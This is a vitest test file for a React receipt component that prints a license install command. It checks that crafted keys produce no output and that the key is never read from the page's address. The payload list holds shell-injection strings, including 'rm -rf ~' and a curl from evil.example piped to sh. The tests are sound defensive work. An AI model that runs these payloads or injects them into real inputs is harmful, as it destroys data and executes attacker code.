import { renderToString } from "react-dom/server"
import { readFileSync } from "node:fs"
import { describe, expect, it } from "vitest"

import { LicenseInstall } from "@/components/site/LicenseInstall"
import { site } from "@/lib/site"

/**
 * What the purchase receipt prints for the buyer to paste into a root shell.
 *
 * The receipt used to read the key from its own address, so a crafted link
 * printed a command that ran someone else's code. lib/installCommand.test.ts
 * covers the rules; this covers the page a buyer actually sees, and that the
 * key can no longer arrive by link at all.
 */

const KEY = "3f2b8c1e-9a4d-4e6f-8b7a-1c2d3e4f5a6b"
const PAYLOADS = ["$(rm -rf ~)", '";rm -rf ~;"', "`id`", `${KEY};id`, `${KEY}$(curl evil.example|sh)`]

/** React escapes text, so the command appears with its quotes as entities. */
const asHtml = (s: string) => s.replace(/&/g, "&amp;").replace(/"/g, "&quot;")

describe("the key and install command on the receipt", () => {
  it("shows our installer for the key, and nothing else", () => {
    const html = renderToString(<LicenseInstall licenseKey={KEY} isCloud={false} />)
    expect(html).toContain(asHtml(`/bin/bash -c "$(curl -fsSL ${site.backendUrl}/onecamp/download/${KEY})"`))
    expect(html).toContain(KEY)
  })

  it("shows no command, and no key, for anything that is not a key", () => {
    for (const payload of PAYLOADS) {
      expect(renderToString(<LicenseInstall licenseKey={payload} isCloud={false} />), payload).toBe("")
    }
  })
})

describe("where the receipt's key comes from", () => {
  const strip = (src: string) => src.replace(/\/\*[\s\S]*?\*\//g, "").replace(/(^|\s)\/\/[^\n]*/g, "$1")
  const page = strip(readFileSync("app/buy/success/page.tsx", "utf8"))
  const checkout = strip(readFileSync("hooks/useCheckout.ts", "utf8"))

  it("is never the address: the page does not read a key or email from it", () => {
    expect(page).not.toMatch(/params\.get\(\s*["'](key|email)["']\s*\)/)
    expect(page).toContain("readPurchase")
    expect(page).toContain("parseLicenseKey(")
  })

  it("is never put in the address by the checkout", () => {
    const pushes = checkout.match(/router\.push\([^)]*\)/g) ?? []
    expect(pushes.length).toBeGreaterThan(0)
    for (const push of pushes) expect(push, push).not.toMatch(/key|email|params/i)
    expect(checkout).toContain("savePurchase(")
  })
})
